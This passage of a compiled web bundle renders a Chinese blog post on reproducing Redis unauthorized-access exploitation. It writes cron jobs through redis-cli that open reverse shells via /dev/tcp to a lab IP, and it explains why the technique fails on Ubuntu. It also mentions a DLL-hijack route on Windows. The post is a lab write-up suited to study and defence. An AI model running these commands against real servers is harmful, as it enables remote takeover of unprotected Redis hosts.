entity",title:"\\n"}},[s._v("\\n")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("*/1 * * * *  bash -c "),a("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[s._v('\\"')]),s._v("bash -i  >&/dev/tcp/192.168.237.1/4444 0>&1"),a("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[s._v('\\"')]),s._v('"')]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/spool/cron/\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename root\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("一直收不到shell，看其他师傅讲两种情况，更站向第二种解释，后面还有第三种解释")]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("ul",[a("li",[s._v("由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败")]),s._v(" "),a("li",[s._v("ubuntu下执行定时任务使用的shell是/bin/sh指向"),a("strong",[s._v("dash")]),s._v("，而"),a("strong",[s._v("dash")]),s._v("并不支持"),a("strong",[s._v("bash -i")]),s._v("，导致命令执行失败")])])]),s._v(" "),a("p",[s._v("失败报错："),a("code",[s._v("/bin/sh: 1: /bin/bash -i >& /dev/tcp/192.168.0.106/7777 0>&1: not found")])]),s._v(" "),a("p",[s._v("可以知道ubuntu执行定时任务使用的shell是"),a("code",[s._v("/bin/sh")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("gzctf@ubuntu:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-al")]),s._v(" /bin/sh\nlrwxrwxrwx "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root root "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(" Mar "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2022")]),s._v(" /bin/sh -"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" dash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("又可以知道ubuntu的"),a("code",[s._v("/bin/sh")]),s._v("指向了"),a("code",[s._v("dash")])]),s._v(" "),a("p",[s._v("了解一下，"),a("code",[s._v("dash")]),s._v("是什么")]),s._v(" "),a("blockquote",[a("p",[s._v("dash 是 Ubuntu 和许多其他 Linux 发行版上的默认系统 shell，尤其是在脚本执行时，如：定时任务。它比 bash 更加轻量，并且兼容性有所差异。bash -i 代表启动一个交互式 shell，而 dash 不支持 -i 选项，因为它不需要启动交互式 shell")])]),s._v(" "),a("p",[s._v("所以，"),a("code",[s._v("dash")]),s._v("在执行定时任务里的"),a("code",[s._v("bash -i ...")]),s._v("不会成功执行。centos可以成功执行是因为centos执行定时任务使用的shell是"),a("code",[s._v("/bin/bash")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/12.png",alt:"12"}})]),s._v(" "),a("p",[s._v("失败原因及两种解决方案：")]),s._v(" "),a("p",[s._v("师傅博客："),a("a",{attrs:{href:"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/",target:"_blank",rel:"noopener noreferrer"}},[s._v("解决ubuntu crontab反弹shell失败的问题"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/13.png",alt:"13"}})]),s._v(" "),a("p",[s._v("两种解决方案：")]),s._v(" "),a("ul",[a("li",[s._v("给ubuntu的"),a("code",[s._v("dash")]),s._v("打个软连接到"),a("code",[s._v("/bin/sh")]),s._v("(bash)，曲线救国")]),s._v(" "),a("li",[s._v("使用"),a("code",[s._v("/bin/bash -c")]),s._v("代替"),a("code",[s._v("bash -i")])])]),s._v(" "),a("h4",{attrs:{id:"改变ubuntu执行定时任务的默认shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#改变ubuntu执行定时任务的默认shell"}},[s._v("#")]),s._v(" 改变ubuntu执行定时任务的默认shell")]),s._v(" "),a("p",[s._v("改变ubuntu执行定时任务的默认shell"),a("code",[s._v("/bin/sh")]),s._v("改为"),a("code",[s._v("bash")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bash")]),s._v(" /bin/sh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("漏洞复现可以改回"),a("code",[s._v("dash")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ln")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-s")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" dash /bin/sh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./redis-cli "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-h")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.140 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 每分钟反弹一次")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" shell "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("* * * * * bash i >& /dev/tcp/192.168.237.1/4444 0>&1"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),s._v("\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /var/spool/cron/crontabs/\nconfig "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" dbfilename root\nsave\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("倒下了，还是没有成功")]),s._v(" "),a("h4",{attrs:{id:"计划任务为何没有成功反弹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#计划任务为何没有成功反弹shell"}},[s._v("#")]),s._v(" 计划任务为何没有成功反弹shell")]),s._v(" "),a("p",[s._v("写计划任务反弹shell存在系统限制，这个方法只能"),a("code",[s._v("Centos")]),s._v("上使用，"),a("code",[s._v("Ubuntu上行不通")]),s._v("，原因如下：")]),s._v(" "),a("ol",[a("li",[a("p",[s._v("因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件"),a("code",[s._v("/var/spool/cron/crontabs/<username>")]),s._v("权限必须是600也就是"),a("code",[s._v("-rw-------")]),s._v("才会执行，否则会报错"),a("code",[s._v("(root) INSECURE MODE (mode 0600 expected)")]),s._v("，而Centos的定时任务文件"),a("code",[s._v("/var/spool/cron/<username>")]),s._v("权限644也能执行")])]),s._v(" "),a("li",[a("p",[s._v("因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错")])])]),s._v(" "),a("p",[s._v("由于系统的不同，crontrab定时文件位置也会不同")]),s._v(" "),a("p",[s._v("Centos的定时任务文件在"),a("code",[s._v("/var/spool/cron/<username>")])]),s._v(" "),a("p",[s._v("Ubuntu定时任务文件在"),a("code",[s._v("/var/spool/cron/crontabs/<username>")])]),s._v(" "),a("p",[s._v("Centos和Ubuntu均存在的（需要root权限）"),a("code",[s._v("/etc/crontab")]),s._v(" PS：高版本的redis默认启动是"),a("code",[s._v("redis")]),s._v("权限，故写这个文件是行不通的")]),s._v(" "),a("p",[s._v("思考：这里windows只写了通过redis写入webshell，没有web服务什么都做不了了吗？windows还可以通过覆盖重要系统dll文件，利用redis的主从功能，写入dbghelp.dll文件，达到在redis执行BGSAVE或者BGREWRITEAOF命令时redis加载dll的目的")]),s._v(" "),a("p",[s._v("参考、致谢：")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://www.svenbeast.com/post/g2K6Xk3IG/",target:"_blank",rel:"noopener noreferrer"}},[s._v("利用Redis Getshell的所有利用方法"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://www.cnblogs.com/websec80/articles/14734623.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题 "),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://www.cnblogs.com/yuzly/p/11663822.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Redis未授权访问漏洞复现"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://blog.csdn.net/qq_43531669/article/details/130574785",target:"_blank",rel:"noopener noreferrer"}},[s._v("Redis未授权漏洞复现"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://wiki.wgpsec.org/knowledge/web/unauthorized.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Redis未授权访问"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/",target:"_blank",rel:"noopener noreferrer"}},[s._v("解决ubuntu crontab反弹shell失败的问题"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);a.default=n.exports}}]);